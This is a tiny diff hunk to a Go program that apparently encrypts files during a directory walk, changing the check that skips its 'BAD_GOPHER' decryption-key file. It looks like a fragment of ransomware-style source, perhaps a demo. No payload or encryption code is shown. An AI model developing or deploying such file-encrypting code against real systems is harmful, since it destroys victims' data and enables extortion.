@@ -196,7 +196,7 @@ func main() {
 		}
 
 		// Don't encrypt the decryption key file
-		if strings.Contains(info.Name(), "BAD_GOPHER.txt") {
+		if strings.Contains(info.Name(), "BAD_GOPHER") {
 			return nil
 		}
 
